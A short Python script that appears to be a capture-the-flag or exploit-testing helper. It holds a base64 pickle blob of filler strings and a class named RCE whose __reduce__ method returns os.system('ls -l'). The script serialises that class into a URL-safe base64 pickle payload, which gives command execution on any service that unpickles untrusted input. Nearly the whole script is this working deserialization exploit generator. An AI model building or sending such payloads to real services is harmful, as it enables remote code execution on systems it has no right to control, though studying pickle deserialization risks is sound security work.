import base64, pickle
a = "gASVTQEAAAAAAABdlCiMAJSMAzEyM5SMA2FzZJSMFGFzZGFzZGFzZGFzZGFzZGFzZGFzlIwKZGFzZGFzZGFzZJSMCWhlaGVoZWhlaJSMCGhlaGVoZWhllIwGMTIzMTIzlIwHYWRhc2Rhc5RoAYwGenhjenhjlIwGYXNkYXNklIwDMTIzlIwJMTIzMTIzMTIzlIwQYXNkYWRhc2Rhc2Rhc2Rhc5SMMXp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enqUjBh6enp6enp6enp6enp6enp6enp6enp6enqUjGAxMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTGUZS4="
#print(pickle.loads(base64.b64decode(a)))

import pickle, base64

class RCE:
	def __reduce__(self):
		import os
		cmd = ('ls -l')
		return (os.system, (cmd,))


pickled = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(pickled))